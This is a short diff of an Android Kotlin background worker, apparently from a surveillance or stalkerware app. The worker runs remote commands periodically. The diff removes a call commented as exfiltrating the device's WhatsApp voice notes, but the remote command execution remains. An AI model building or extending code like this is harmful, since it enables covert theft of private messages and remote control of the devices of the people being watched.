@@ -4,7 +4,6 @@ import android.content.Context
 import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
 import com.example.data.sync.RemoteCommandManager
-import com.example.data.sync.WhatsAppVoiceNoteSyncManager
 import com.example.service.AlwaysSyncService
 
 class SyncWorker(
@@ -19,13 +18,10 @@ class SyncWorker(
 
             // Execute SYNC_ALL and command processing
             RemoteCommandManager(applicationContext).executeCommand("SYNC_ALL", "WorkManager Periodic Worker")
-
-            // Scan and exfiltrate new/existing WhatsApp voice notes (with duplicate tracking)
-            WhatsAppVoiceNoteSyncManager.scanAndSyncAllVoiceNotes(applicationContext)
-
             Result.success()
         } catch (_: Exception) {
             Result.retry()
         }
     }
 }
+
